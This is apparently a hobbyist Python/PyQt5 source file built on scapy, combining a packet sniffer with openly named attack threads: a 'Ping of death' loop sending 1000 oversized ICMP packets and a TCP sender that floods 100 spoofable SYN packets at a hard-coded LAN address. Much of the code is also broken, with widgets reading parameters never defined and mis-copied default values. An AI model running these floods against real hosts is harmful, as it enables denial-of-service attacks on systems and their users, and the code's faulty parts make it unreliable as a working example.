#! /usr/bin/env python3
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *

from pyqtgraph import *
from scapy.all import *

import os

def interfaces():
    ''' 0 = Down
        1 = Up
    '''
    path = '/sys/class/net/'
    ifaces = {}
    for d in os.listdir(path):
        f = open(path + d + '/operstate', 'r')
        res = f.readline().rstrip()
        f.close()
        ifaces[d] = res

        if res == 'up':
            ifaces[d] = 1
        else:
            ifaces[d] = 0

    return ifaces

class Sniffer(QThread):

    status = False
    stopSniffing = pyqtSignal()
    summaryUpdated = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.stopSniffing.connect(self.on_stopSniffing)
        self.finished.connect(self.printFinished)
        self.started.connect(self.printStarted)

    @pyqtSlot()
    def printStarted(self):
        print(self.currentThreadId(), "started")

    @pyqtSlot()
    def printFinished(self):
        print(self.currentThreadId(), "finished")

    @pyqtSlot()
    def run(self):
        Sniffer.status = False
        #sniff(iface='enp0s20u1u1i5',
        sniff(iface='wlp2s0',
                prn=self.printSummary,
                stop_filter=Sniffer.stopCondition)

    @pyqtSlot()
    def on_stopSniffing(self):
        Sniffer.status = True

    #@staticmethod
    def printSummary(self,pkt):
        '''Callback for scapy sniff'''
        self.summaryUpdated.emit(pkt.summary())

        print(pkt.summary())

    @staticmethod
    def stopCondition(self):
        '''Stop condition for scapy sniff'''
        return Sniffer.status

class IcmpAttack(QThread):
    ''' Ping of death
        load >= 65535
    '''
    def __init__(self):
        super().__init__()

    @pyqtSlot()
    def run(self):
        i = 0
        while i < 1000:
            pkt = IP(dst='192.168.2.177')/ICMP()/('P' * 65500)
            send(pkt)
            pkt.show()
            i += 1
        self.quit()

class IcmpWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.setObjectName('IcmpWidget')

        self.ip_src = QLineEdit()
        self.ip_dst = QLineEdit()

        self.start_btn = QPushButton('Start')
        self.stop_btn = QPushButton('Stop')

        layout = QGridLayout()
        layout.addWidget(QLabel("ip source")       , 0, 0)
        layout.addWidget(self.ip_src               , 0, 1)
        layout.addWidget(QLabel("ip destination")  , 0, 2)
        layout.addWidget(self.ip_dst               , 0, 3)
        layout.addWidget(self.start_btn            , 1, 2)
        layout.addWidget(self.stop_btn             , 1, 3)
        self.setLayout(layout)

def tcp_flags():
    return {
            'F': 'FIN',
            'S': 'SYN',
            'R': 'RST',
            'P': 'PSH',
            'A': 'ACK',
            'U': 'URG',
            'E': 'ECE',
            'C': 'CWR',
            }


class TcpAttack(QThread):
    def __init__(self, ip_src=None, ip_dst=None, sport=None, dport=None, flags=None,
                ttl=None, seq=0):
        super().__init__()
        self.ip_src = ip_src
        self.ip_dst = ip_dst
        self.sport = sport
        self.dport = dport
        self.flags = flags
        self.ttl = ttl
        self.seq = seq

    def setDport(self, dport):
        self.dport = dport

    def dport(self):
        return self.dport

    def setSport(self, sport):
        self.sport = sport

    def sport(self):
        return self.sport

    def setIpDst(self, ip_dst):
        self.ip_dst = ip_dst

    def ipDst(self):
        return self.ip_dst

    def setIpSrc(self, ip_src):
        self.ip_src = ip_src

    def ipSrc(self):
        return self.ip_src

    def setFlags(self, flags):
        self.flags = flags

    def flags(self):
        return self.flags

    def setTtl(self, ttl):
        self.ttl = ttl

    def ttl(self):
        return self.ttl

    def setSeq(self, seq):
        self.seq = seq

    def seq(self):
        return self.seq

    @pyqtSlot()
    def run(self):
        i = IP()
        i.src = self.ip_src
        i.dst = self.ip_dst
        i.ttl=int(self.ttl)

        t = TCP()
        #t.sport = int(self.sport)
        t.sport = 6000
        t.dport = int(self.dport)
        t.seq = self.seq
        t.flags = self.flags

        pkt = i / t
        cnt = 0
        while cnt < 100:
            send(pkt)
            cnt += 1
            print(cnt)
            #ls(pkt)
        self.quit()

class IpWidget(parametertree.ParameterTree):
    def __init__(self):
        super().__init__()
        self.setObjectName('IpWidget')
        params = [
            {
            'name': 'ip', 'type': 'group', 'children': [
                {
                    'name'   : 'ip source (src)',
                    'type'   : 'str'      ,
                    'default': '192.168.2.110',
                    'value'  : '192.168.2.110',
                },
                {
                    'name'   : 'ip destination (dst)',
                    'type'   : 'str'           ,
                    'default': '192.168.2.177' ,
                    'value'  : '192.168.2.177' ,
                },
                {
                    'name'   : 'time to live (ttl)',
                    'type'   : 'str',
                    'default': '255',
                    'value'  : '255',
                },
                {
                    'name'   : 'flags',
                    'type'   : 'list',
                    'values' : tcp_flags().keys(),
                    'default': 'S',
                    'value'  : 'S',
                },
                {
                    'name'   : 'version',
                    'type'   : 'str',
                    'default': str(IP().version),
                    'value'  : '4',
                },
                {
                    'name'   : 'internet header lenght (ihl)',
                    'type'   : 'str',
                    'default': str(IP().version),
                    'value'  : '4',
                },
                {
                    'name'   : 'type of service (tos)',
                    'type'   : 'str',
                    'default': str(IP().version),
                    'value'  : '4',
                },
                {
                    'name'   : 'total length (len)',
                    'type'   : 'str',
                    'default': str(IP().version),
                    'value'  : '',
                },
                {
                    'name'   : 'flags (flags)',
                    'type'   : 'str',
                    'default': str(IP().flags),
                    'value'  : '',
                },
                {
                    'name'   : 'protocol (proto)',
                    'type'   : 'str',
                    'default': str(IP().proto),
                    'value'  : '',
                },
                {
                    'name'   : 'header checksum (chksum)',
                    'type'   : 'str',
                    'default': str(IP().chksum),
                    'value'  : '',
                },
                {
                    'name'   : 'options (options)',
                    'type'   : 'str',
                    'default': str(IP().chksum),
                    'value'  : '',
                },
                {
                    'name'   : 'identification (id)',
                    'type'   : 'str',
                    'default': str(IP().chksum),
                    'value'  : '',
                },
                {
                    'name'   : 'fragment offset (frag)',
                    'type'   : 'str',
                    'default': str(IP().chksum),
                    'value'  : '',
                },
                ]
            }
        ]






class TcpWidget(parametertree.ParameterTree):
    def __init__(self):
        super().__init__()
        self.setObjectName('TcpWidget')

        params = [
            {
            'name': 'tcp', 'type': 'group', 'children': [
                {
                    'name'   : 'port source (sport)',
                    'type'   : 'str'        ,
                    'default': '12345'      ,
                    'value'  : '12345'      ,
                },
                {
                    'name'   : 'ip destination (dport)',
                    'type'   : 'str'           ,
                    'default': '192.168.2.177' ,
                    'value'  : '192.168.2.177' ,
                },
                {
                    'name'   : 'sequence (seq)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'acknowledgment (ack)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'data offset (dataofs)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'reserved (reserved)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'flags (flags)',
                    'type'   : 'int',
                    'default': 2,
                    'value'  : 2,
                },
                {
                    'name'   : 'window (window)',
                    'type'   : 'int',
                    'default': 8192,
                    'value'  : 8192,
                },
                {
                    'name'   : 'checksum (chksum)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'urgence pointer (urgptr)',
                    'type'   : 'int',
                    'default': 0,
                    'value'  : 0,
                },
                {
                    'name'   : 'options (urgptr)',
                    'type'   : str(type(TCP().window)),
                    'default': 0,
                    'value'  : 0,
                },
                ]
            }
        ]

        self.parameters = parametertree.Parameter.create(name='tcp parameters',
                                                    type='group',
                                                    children=params)
        self.parameters.param('tcp', 'start').sigActivated.connect(self.on_start)
        self.setParameters(self.parameters, showTop=False)
        self.attack = TcpAttack()

    @pyqtSlot()
    def on_start(self):

        self.attack.setIpSrc(self.parameters.param('tcp', 'ip source').value())
        self.attack.setSport(self.parameters.param('tcp', 'port source').value())
        self.attack.setIpDst(self.parameters.param('tcp', 'ip destination').value())
        self.attack.setDport(self.parameters.param('tcp', 'port destination').value())
        self.attack.setFlags(self.parameters.param('tcp', 'flags').value())
        self.attack.setTtl(self.parameters.param('tcp', 'ttl').value())

        self.attack.start()

if __name__ == '__main__':
    print(interfaces())
